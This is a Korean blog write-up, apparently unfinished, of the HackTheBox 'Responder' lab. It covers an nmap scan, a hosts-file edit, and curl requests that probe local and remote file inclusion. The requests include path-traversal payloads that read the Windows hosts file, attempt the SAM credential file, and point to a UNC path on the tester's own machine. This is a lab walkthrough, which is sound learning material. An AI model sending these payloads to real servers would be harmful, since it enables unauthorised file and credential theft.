---
title: HTB Responder Write-up
categories: [HackTheBox, Basic]
tags: [HackTheBox]
image:
    path: /assets/image_post/20240206200539.png
---

대상 서버 nmap 스캔 결과는 아래와 같다. (동일한 인자를 줬지만 kali에선 되고 mac에선 되지 않았다...왜그럴까..)
``` bash
# nmap 10.129.2.235 -sC -sV -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-05 14:03 UTC
Nmap scan report for 10.129.2.235
Host is up (0.51s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 197.03 seconds
```

80 port로 접근가 열려있는 것을 확인할 수 있으며, 접근 시 아래와 같이 .htb 사이트로 이동된다.

``` bash
# curl 10.129.73.133
<meta http-equiv="refresh" content="0;url=http://unika.htb/">#
```

하지만 이동 된 후 아무 페이지를 찾을 수 없다는 내용만 존재하여, 다양한 시도를 해보았으나 문제를 풀 수가 없었다.
![](../assets/image_post/20240207174302.png)

알고 보니 해당 증상은 문제가 있는 것으로 아래와 같이 hosts 파일을 수정해주어야 정상적으로 사이트에 접근된다.
``` bash 
sudo vi /etc/hosts

# 아래 IP는 각자 발급 받은 Machine의 IP 입력 필요
10.129.73.133    unika.htb
```

수정 후 사이트에 접근하면 정상적으로 접근되는 것을 확인 할 수 있다.
![](../assets/image_post/20240207174736.png)

문제를 풀던 중 아래 문제의 답이 도저히 나오지 않아 결국 타 공략을 보았다. NT Lan Manager가 많이 나와 왜 글자 수가 다르지? 생각했지만, NT도 줄임말이여서 그런 것이였다...괜히 패배한 기분이다.
![](../assets/image_post/20240207175049.png)

해당 사이트의 국가별 언어를 변경하면 아래 그림과 같이 page 파라미터에 인자를 받아온 것을 알 수 있다. 
![](../assets/image_post/20240207233736.png)

파일 명을 지정하고 있으므로 LFI와 RFI를 테스트해보았다. 지정한 경로는 문제에서 예시로 들어준 경로이다.
``` bash
 read-min 🎉   ~  curl http://unika.htb/index.php\?page\=../../../../../../../../windows/system32/drivers/etc/hosts

# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
```
주요 파일에 대해서도 접근이 되는지 테스트 해보았으나, "Permission denied"가 반환되는 것을 알 수 있다.
``` bash
 ⚡ read-min 🔑   ~  curl http://unika.htb/index.php\?page\=../../../../../../../../../../../../Windows/System32/config/SAM
<br />
<b>Warning</b>:  include(../../../../../../../../../../../../Windows/System32/config/SAM): Failed to open stream: Permission denied in <b>C:\xampp\htdocs\index.php</b> on line <b>11</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '../../../../../../../../../../../../Windows/System32/config/SAM' for inclusion (include_path='\xampp\php\PEAR') in <b>C:\xampp\htdocs\index.php</b> on line <b>11</b><br />
```
<br/>

아래는 RFI를 테스트한 결과이다. 아래의 결과처럼 존재하지 않는 파일에 대해선 "No such file"가 반환된다.
``` bash
 ⚡ read-min 🔑   ~  curl http://unika.htb/index.php\?page\=//10.10.14.6/somefile
<br />
<b>Warning</b>:  include(\\10.10.14.6\SOMEFILE): Failed to open stream: No such file or directory in <b>C:\xampp\htdocs\index.php</b> on line <b>11</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '//10.10.14.6/somefile' for inclusion (include_path='\xampp\php\PEAR') in <b>C:\xampp\htdocs\index.php</b> on line <b>11</b><br />
```


작성 중

10.129.225.86

echo "10.129.225.86 unika.htb" | sudo tee -a /etc/hosts
